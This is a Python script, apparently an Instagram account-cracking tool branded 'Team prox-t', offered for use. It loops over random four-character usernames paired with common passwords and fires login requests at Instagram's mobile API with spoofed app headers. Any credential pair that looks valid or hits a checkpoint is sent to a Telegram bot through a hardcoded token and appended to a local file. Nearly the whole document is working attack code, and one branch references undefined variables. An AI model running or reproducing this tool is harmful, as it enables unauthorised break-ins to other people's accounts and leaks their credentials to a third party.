import requests, pyfiglet,time,sys,webbrowser 
Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
logo = pyfiglet.figlet_format('omarproxt')
print(a_bSa+logo)
import requests
import random
from uuid import uuid4
E = '\033[1;31m'
G = '\033[1;32m'
def HsEyUn():
	
	token = ('5214834535:AAGDw6Aec2EzGckY9ka9sBgEzX5Tm_rJdt0')
	id = input(G+'Enter Id••>> ')
	while True:
		us3 = 'qwertyuiopasdf_ghjklzxcvbnm'
		us0 = '09876_54321'
		use1 = us0 + us3
		userx = ''.join((random.choice(use1) for x in range(4)))
		usr = userx
		HsEu = ('1122334455', 'Aa123123', 'Aa123456', '12341234', 'qwer1234', '1234qwer')
		t1 = random.choice(usr)
		t = random.choice(HsEu)
		url = 'https://i.instagram.com/api/v1/accounts/login/'
		headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
'Cookie':'missing', 
'Accept-Encoding':'gzip, deflate', 
'Accept-Language':'en-US', 
'X-IG-Capabilities':'3brTvw==', 
'X-IG-Connection-Type':'WIFI', 
'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
'Host':'i.instagram.com'}
		uid= str(uuid4())
		data = {'uuid':uid,
'password':t, 
'username':usr, 
'device_id':uid, 
'from_reg':'false', 
'_csrftoken':'missing', 
'login_attempt_countn':'0'}
		reqq= requests.post(url, headers=headers, data=data, allow_redirects=True)
		
		if "rate_limit_error" in reqq.text:
			print (G+f"Kid -13 Ban : {usr}:{t}")
			tlg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=Team prox-t\n = = = = = = = = = = = =\n USER : {usr}\n PASS : {t}\n = = = = = = = = = = = =')
			a = requests.post(tlg)
			open("Acconat.txt","a").write(f"Band >> {usr}:{t}\n")
			
		elif 'bad_password' in reqq.text:
			print(E+f"Error Password : {usr}:{t}")
		elif 'checkpoint_challenge_required' in reqq.text:
			print (G+f"Checkpoint : {usr}:{t}")
			tlgg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=Team prox-t\n = = = = = = = = = = = =\n USER : {username}\n PASS : {password}\n = = = = = = = = = = = =')
			a = requests.post(tlgg)
			open("Acconat.txt","a").write(f" Chckpoint >> {usr}:{t}\n")
		
		else:
			print(G+f"Fall Login ! : {usr}:{t}")
			tlggg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=Team prox-t\n = = = = = = = = = = = =\n USER : {usr}\n PASS : {t}\n = = = = = = = = = = = =')
			a = requests.post(tlggg)
HsEyUn()
